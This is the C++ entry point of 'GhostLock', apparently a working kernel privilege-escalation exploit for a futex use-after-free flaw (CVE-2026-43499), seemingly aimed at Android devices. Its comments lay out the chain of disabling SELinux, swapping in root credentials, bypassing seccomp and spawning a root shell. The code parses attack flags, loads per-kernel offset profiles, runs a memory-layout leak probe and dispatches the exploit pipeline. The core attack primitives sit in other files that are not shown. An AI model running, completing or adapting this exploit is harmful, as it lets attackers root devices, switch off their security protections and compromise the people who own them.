/*
 * GhostLock — CVE-2026-43499 futex PI UAF exploit
 *
 * W1: SELinux permissive -> W2: cred = init_cred -> W3: seccomp bypass ->
 * independent root shell: ksud late-load + module watch.
 *
 * This translation unit is the thin adapter: parse, run the stage sequence and
 * map the outcome to the process exit code. Setup, attack primitives, victim
 * protocol and stage policy live in their own units under ghostlock::attack,
 * ghostlock::session::victim, ghostlock::race and ghostlock::session::stages.
 */

#include "common.h"

#include "attack/ops.hpp"
#include "kernelsnitch/stride_verify.h"
#include "profile/entry.h"
#include "profile/pipeline_check.h"
#include "support/fatal_error.hpp"
#include "support/run_state.hpp"
#include "route/orchestrator.hpp"
#include "session/dirtyfrag_stage.hpp"

#include <array>
#include <cstdio>
#include <memory>
#include <string>
#include <string_view>

using namespace ghostlock;


int main(int argc, char **argv) {
    /* Line-buffer stdout: the launcher redirects it to the run log file, and a
     * block-buffered stream loses the last seconds of the attack when the
     * device freezes mid-run (observed 2026-10-08: the log trailed the kernel
     * trace by ~2 s at freeze time). */
    std::setvbuf(stdout, nullptr, _IOLBF, 0);
    try {
        profile::kernel_offsets decoded = {};
        std::array<char, 256> release_buf{};
        binary_profile::component_ids ids{
            static_cast<uint16_t>(runtime::FrontendKind::RootChild),
            static_cast<uint16_t>(runtime::BackendKind::Cve2026_43499),
            0,
        };
        binary_profile::digests digests{};

        bool app_call = false;
        bool force_attack = false;
        bool status_record = false;
        bool probe_stride = false;
        bool w1_only = false;
        const char *dirtyfrag_plan = nullptr;
        const char *dirtyfrag_mode = "full";
        const char *prebuilt_path = nullptr;
        const char *dump_dir = nullptr;
        for (int32_t i = 1; i < argc; i++) {
            if (std::string_view(argv[i]) == "--ghostlock-app-call") {
                app_call = true;
            } else if (std::string_view(argv[i]) == "--force-attack") {
                force_attack = true;
            } else if (std::string_view(argv[i]) == "--enable-status-record") {
                status_record = true;
            } else if (std::string_view(argv[i]) == "--probe-stride") {
                probe_stride = true;
            } else if (std::string_view(argv[i]) == "--w1-only") {
                w1_only = true;
            } else if (std::string_view(argv[i]) == "--dirtyfrag" && i + 1 < argc) {
                dirtyfrag_plan = argv[++i];
            } else if (std::string_view(argv[i]) == "--dirtyfrag-mode" && i + 1 < argc) {
                dirtyfrag_mode = argv[++i];
            } else if (std::string_view(argv[i]) == "--load-prebuilt-profile" &&i + 1 < argc) {
                prebuilt_path = argv[++i];
            } else if (std::string_view(argv[i]) == "--dump-kernel-log" && i + 1 < argc) {
                dump_dir = argv[++i];
            } else {
                pr_error("usage: %s [--ghostlock-app-call | --load-prebuilt-profile <bin>]"
                " [--dump-kernel-log <dir>] [--force-attack] [--enable-status-record]"
                " [--probe-stride] [--w1-only] [--dirtyfrag <plan> [--dirtyfrag-mode full|noshell|noscript]]\n", argv[0]);
                return 1;
            }
        }
        if (app_call && prebuilt_path) {
            pr_error("choose one entrypoint\n");
            return 1;
        }
        if (status_record && !app_call) {
            pr_error("--enable-status-record requires --ghostlock-app-call\n");
            return 1;
        }
        support::run_state::configure(status_record);
        /* Second way, native half: the app has already applied W1 and written
         * the control file; run the page-cache stage and the root script. No
         * profile is loaded — this mode never touches the futex route. */
        if (dirtyfrag_plan != nullptr) {
            if (config::runtime_config_snapshot().init() != 0) {
                pr_error("runtime configuration failed errno=%d\n", errno);
                throw FatalError{};
            }
            return session::run_dirtyfrag_stage(dirtyfrag_plan, dirtyfrag_mode);
        }
        /* Second way: the backend stops after W1 and the frontend handoff is
         * skipped; the app runs the DirtyFrag page-cache stage afterwards. */
        session::g_exploit_session.w1_only = w1_only;

        int32_t loaded;
        if (prebuilt_path != nullptr) {
            loaded = profile_entry::read_glk1_file(prebuilt_path, &decoded, release_buf.data(),
                                                   release_buf.size(), &ids, &digests);
        } else if (app_call) {
            loaded = status_record
                         ? profile_entry::read_glk1_frame_stdin(
                               &decoded, release_buf.data(), release_buf.size(), &ids, &digests)
                         : profile_entry::read_glk1_stdin(
                               &decoded, release_buf.data(), release_buf.size(), &ids, &digests);
        } else {
            pr_error("no entrypoint: pass --ghostlock-app-call or --load-prebuilt-profile <bin>\n");
            return 1;
        }
        if (loaded == binary_profile::kDigestMismatch) {
            /* The app's schema and this build's disagree about which keys cross
             * the transport (or the payload was corrupted); running on it would
             * use defaults for whatever went missing. */
            pr_error("profile digest mismatch: sent=0x%016llx computed=0x%016llx\n",
                     static_cast<unsigned long long>(digests.transmitted.value_or(0)),
                     static_cast<unsigned long long>(digests.computed));
            throw FatalError{};
        }
        if (loaded != 0) {
            pr_error("cannot load profile\n");
            throw FatalError{};
        }
        if (digests.transmitted) {
            pr_info("profile digest=0x%016llx verified (recomputed 0x%016llx)\n",
                    static_cast<unsigned long long>(*digests.transmitted),
                    static_cast<unsigned long long>(digests.computed));
        } else {
            pr_info("profile digest: absent (app build predates it)\n");
        }

        /* The app resolved the profile's ordered pipeline list to one entry and
         * wrote it into the wire; the invocation must match. A mismatch means
         * the two sides disagree about the run's shape: a resolved DirtyFrag run
         * started as the full chain would run the wrong stage, and a GhostLock
         * run stopped after W1 would leave SELinux permissive with no stage to
         * continue. Absent (a document that predates the cross-check) keeps the
         * legacy behaviour. */
        switch (profile::check_pipeline(decoded.meta.pipeline, w1_only)) {
            case profile::PipelineCheck::NotDeclared:
                break;
            case profile::PipelineCheck::Unknown:
                pr_error("profile pipeline=%u is unknown; refusing to run\n",
                         static_cast<unsigned>(decoded.meta.pipeline.value_or(0)));
                throw FatalError{};
            case profile::PipelineCheck::Mismatch:
                pr_error("pipeline mismatch: profile resolved %s, native invoked %s\n",
                         decoded.meta.pipeline == profile::kPipelineDirtyfrag
                             ? "dirtyfrag"
                             : "ghostlock",
                         w1_only ? "with --w1-only" : "as the full chain");
                throw FatalError{};
            case profile::PipelineCheck::Match:
                pr_info("pipeline=%s verified against the invocation\n",
                        decoded.meta.pipeline == profile::kPipelineDirtyfrag
                            ? "dirtyfrag"
                            : "ghostlock");
                break;
        }

        auto &session = session::g_exploit_session;
        if (probe_stride) {
            /* Profile-generation probe: run only the mm_struct leak rounds and
             * print the slab-stride evidence table. The route, the payload page
             * and the handoff are never touched; the app parses the [stride]
             * lines and shows the candidate picker. */
            session.heap.init();
            support::disable_rseq_for_thread();
            kernel::set_unbuffer();
            signal(SIGPIPE, SIG_IGN);
            kernel::set_limit();
            route::reserve_standard_io();
            if (config::runtime_config_snapshot().init() != 0) {
                pr_error("runtime configuration failed errno=%d\n", errno);
                throw FatalError{};
            }
            if (!session.profile.loaded()) attack::install_profile(decoded);
            /* The probe is not route-timed, and the profile's gold-cluster CPUs
             * (4/5) are exactly the ones the vendor core_ctl pauses for
             * seconds at a time; clone_child()'s pin would kill the round.
             * The silver pair 0/1 is always in cpu_active_mask and in the
             * app's cpuset. */
            config::runtime_config_snapshot().main_cpu = 0;
            config::runtime_config_snapshot().consumer_cpu = 1;
            attack::apply_iomem_cache();
            (void) support::probe_mm_stride(0, kernelsnitch::STRIDE_MAX_ROUNDS);
            return 0;
        }
        /* The component selection comes from the wire; the route field is the
         * fallback when a middleware id was not carried. */
        if (ids.middleware == 0) {
            ids.middleware = static_cast<uint16_t>(decoded.route_kind());
        }
        const runtime::ComponentSelection selection{
            static_cast<runtime::FrontendKind>(ids.frontend),
            static_cast<runtime::BackendKind>(ids.backend),
            static_cast<runtime::MiddlewareKind>(ids.middleware),
        };
        if (!runtime::selection_supported(selection)) {
            /* Known-but-unavailable ids land here (unknown ids were rejected at
             * decode time), with the three dimensions named for diagnosis. */
            const std::string frontend(runtime::frontend_name(selection.frontend));
            const std::string backend(runtime::backend_name(selection.backend));
            const std::string middleware(runtime::middleware_name(selection.middleware));
            pr_error("unsupported component selection: frontend=%s backend=%s middleware=%s\n",
                     frontend.c_str(), backend.c_str(), middleware.c_str());
            throw FatalError{};
        }
        /* Batch 4 (D1=B): the orchestrator dispatches the catalogued pipeline
         * directly (backend steps + frontend handoff). DiagnosticStop is a
         * successful early stop (objective already met), not a full run. */
        const runtime::RunResult result = runtime::run_orchestrated_pipeline(
            session, selection, decoded, dump_dir, force_attack);
        switch (result.code) {
            case runtime::RunCode::Rejected:
                pr_error("orchestrator rejected the component selection\n");
                throw FatalError{};
            case runtime::RunCode::Failed:
                return 1;
            case runtime::RunCode::Completed:
            case runtime::RunCode::DiagnosticStop:
                return 0;
        }
        throw FatalError{};
    } catch (const FatalError &) {
        return 1;
    }
}
